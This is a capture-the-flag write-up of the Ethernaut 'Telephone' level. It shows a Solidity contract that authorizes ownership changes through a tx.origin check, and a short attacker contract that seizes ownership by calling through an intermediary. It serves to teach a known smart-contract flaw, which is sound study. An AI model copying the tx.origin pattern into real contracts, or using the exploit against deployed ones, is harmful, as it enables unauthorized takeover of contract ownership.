# Telephone

> Claim ownership of the contract below to complete this level.
> Things that might help
> See the Help page above, section "Beyond the console"

```solidity
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

The challenge is basically asking you to find a way to call `changeOwner` with your address in a way that `tx.origin` differs from `msg.sender`.

If we call a method from a contract A which calls some method from another contract B, the contract B will see our address as `tx.origin` and A's address as `msg.sender`.

As the `"Things that might help"` suggested, we need to deploy a contract:

```solidity
pragma solidity ^0.4.18;

contract Telephone {
  function changeOwner(address _owner) public;
}

contract Caller {
    Telephone k;

    constructor(address victim) public {
        k = Telephone(victim);
        k.changeOwner(msg.sender);
    }

}

```

Note we're using Solidity `0.4.18` and constructors now have their own keyword. :)

We set `victim` to our instance's address and deploy the contract, changing the owner. We can check the owner with `await contract.owner()` while the transaction gets processed.


